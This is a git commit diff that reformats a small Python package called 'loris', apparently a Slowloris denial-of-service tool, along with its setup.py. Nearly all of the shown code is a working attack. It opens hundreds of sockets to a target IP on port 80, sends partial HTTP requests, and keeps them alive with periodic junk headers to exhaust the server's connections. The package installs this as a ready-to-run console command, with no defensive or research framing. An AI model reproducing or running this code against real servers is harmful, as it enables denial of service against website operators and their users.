515c8eb5a96460304fe8f050186c77483bf13213
abdalrzag eisa <bmjfdrh@gmail.com>
2022-11-28 20:35:08 +0300

    format code, and some fixes

--- loris.py
+++ loris.py
@@ -1,94 +1,97 @@
 import click
-import os
 import socket
 import random
 import time
 
+
 class color:
-    CEND      = '\33[0m'
-    CBOLD     = '\33[1m'
-    CITALIC   = '\33[3m'
-    CURL      = '\33[4m'
-    CBLINK    = '\33[5m'
-    CBLINK2   = '\33[6m'
-    CSELECTED = '\33[7m'
+    CEND = "\33[0m"
+    CBOLD = "\33[1m"
+    CITALIC = "\33[3m"
+    CURL = "\33[4m"
+    CBLINK = "\33[5m"
+    CBLINK2 = "\33[6m"
+    CSELECTED = "\33[7m"
 
-    CBLACK  = '\33[30m'
-    CRED    = '\33[31m'
-    CGREEN  = '\33[32m'
-    CYELLOW = '\33[33m'
-    CBLUE   = '\33[34m'
-    CVIOLET = '\33[35m'
-    CBEIGE  = '\33[36m'
-    CWHITE  = '\33[37m'
+    CBLACK = "\33[30m"
+    CRED = "\33[31m"
+    CGREEN = "\33[32m"
+    CYELLOW = "\33[33m"
+    CBLUE = "\33[34m"
+    CVIOLET = "\33[35m"
+    CBEIGE = "\33[36m"
+    CWHITE = "\33[37m"
 
-    CBLACKBG  = '\33[40m'
-    CREDBG    = '\33[41m'
-    CGREENBG  = '\33[42m'
-    CYELLOWBG = '\33[43m'
-    CBLUEBG   = '\33[44m'
-    CVIOLETBG = '\33[45m'
-    CBEIGEBG  = '\33[46m'
-    CWHITEBG  = '\33[47m'
+    CBLACKBG = "\33[40m"
+    CREDBG = "\33[41m"
+    CGREENBG = "\33[42m"
+    CYELLOWBG = "\33[43m"
+    CBLUEBG = "\33[44m"
+    CVIOLETBG = "\33[45m"
+    CBEIGEBG = "\33[46m"
+    CWHITEBG = "\33[47m"
 
-    CGREY    = '\33[90m'
-    CRED2    = '\33[91m'
-    CGREEN2  = '\33[92m'
-    CYELLOW2 = '\33[93m'
-    CBLUE2   = '\33[94m'
-    CVIOLET2 = '\33[95m'
-    CBEIGE2  = '\33[96m'
-    CWHITE2  = '\33[97m'
+    CGREY = "\33[90m"
+    CRED2 = "\33[91m"
+    CGREEN2 = "\33[92m"
+    CYELLOW2 = "\33[93m"
+    CBLUE2 = "\33[94m"
+    CVIOLET2 = "\33[95m"
+    CBEIGE2 = "\33[96m"
+    CWHITE2 = "\33[97m"
 
-    CGREYBG    = '\33[100m'
-    CREDBG2    = '\33[101m'
-    CGREENBG2  = '\33[102m'
-    CYELLOWBG2 = '\33[103m'
-    CBLUEBG2   = '\33[104m'
-    CVIOLETBG2 = '\33[105m'
-    CBEIGEBG2  = '\33[106m'
-    CWHITEBG2  = '\33[107m'
+    CGREYBG = "\33[100m"
+    CREDBG2 = "\33[101m"
+    CGREENBG2 = "\33[102m"
+    CYELLOWBG2 = "\33[103m"
+    CBLUEBG2 = "\33[104m"
+    CVIOLETBG2 = "\33[105m"
+    CBEIGEBG2 = "\33[106m"
+    CWHITEBG2 = "\33[107m"
 
 
-class log:
-
+class Log:
     def Info(self, msg):
         click.echo(f"\n[{color.CGREEN2}Info{color.CEND}]: {msg}")
 
-    def Warn(self, msg): 
+    def Warn(self, msg):
         click.echo(f"\n[{color.CYELLOW2}Warning{color.CEND}]: {msg}")
-    
-    def Error(self, msg): 
+
+    def Error(self, msg):
         click.echo(f"\n[{color.CRED2}Error{color.CEND}]: {msg}")
 
-log = log()
+
+log = Log()
+
 
 @click.command()
 @click.argument("ip")
 def main(ip):
     click.clear()
-    click.echo(r"""
- __         ______     ______     __     ______    
-/\ \       /\  __ \   /\  == \   /\ \   /\  ___\   
-\ \ \____  \ \ \/\ \  \ \  __<   \ \ \  \ \___  \  
- \ \_____\  \ \_____\  \ \_\ \_\  \ \_\  \/\_____\ 
-  \/_____/   \/_____/   \/_/ /_/   \/_/   \/_____/ 
-    """)
-    
+    click.echo(
+        r"""
+ __         ______     ______     __     ______
+/\ \       /\  __ \   /\  == \   /\ \   /\  ___\
+\ \ \____  \ \ \/\ \  \ \  __<   \ \ \  \ \___  \
+ \ \_____\  \ \_____\  \ \_\ \_\  \ \_\  \/\_____\
+  \/_____/   \/_____/   \/_/ /_/   \/_/   \/_____/
+    """
+    )
+
     try:
         global AllTheSockets
         headers = [
             "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
             "Accept-language: en-US,en,q=0.5",
-            "Connection: Keep-Alive"
+            "Connection: Keep-Alive",
         ]
-        
+
         sockets = random.randint(200, 800)
         port = 80
         AllTheSockets = []
         log.Info(f"Attacking {ip} with {sockets} sockets.")
         log.Info("Creating sockets...")
-        for k in range(sockets):
+        for _ in range(sockets):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(4)
@@ -101,14 +104,18 @@ def main(ip):
         for r in AllTheSockets:
             click.echo(f"[{num}]")
             num += 1
-            r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+            r.send(
+                "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
+            )
             for header in headers:
                 r.send(bytes("{}\r\n".format(header).encode("utf-8")))
-        
+
         while True:
             for v in AllTheSockets:
                 try:
-                    v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
+                    v.send(
+                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
+                    )
                 except:
                     log.Error("A socket failed, reattempting...")
                     AllTheSockets.remove(v)
@@ -117,7 +124,11 @@ def main(ip):
                         v.settimeout(4)
                         v.connect((ip, port))
 
-                        v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
+                        v.send(
+                            "GET /?{} HTTP/1.1\r\n".format(
+                                random.randint(0, 2000)
+                            ).encode("utf-8")
+                        )
                         for header in headers:
                             v.send(bytes("{}\r\n".format(header).encode("utf-8")))
 
@@ -126,7 +137,7 @@ def main(ip):
             log.Info("Successfully sent keep-alive headers.. ")
             time.sleep(random.randint(1, 2))
 
-    except ConnectionRefusedError: 
+    except ConnectionRefusedError:
         log.Error("Connection refused, retrying")
         main(ip)
 
--- setup.py
+++ setup.py
@@ -1,20 +1,13 @@
 from setuptools import setup
-from setuptools.command.test import test as TestCommand
-
-
 
 setup(
-    name='loris',
-    version=1.0,
-    description='',
-    author='senpai-10',
-    url='https://github.com/Senpai-10/loris',
-    install_requires=['click>=3.0'],
+    name="loris",
+    version="1.0.0",
+    description="",
+    author="senpai-10",
+    url="https://github.com/Senpai-10/loris",
+    install_requires=["click>=3.0"],
     include_package_data=True,
     py_modules=["loris"],
-    entry_points={
-        'console_scripts': [
-            "loris = loris:main"
-        ]
-    }
+    entry_points={"console_scripts": ["loris = loris:main"]},
 )
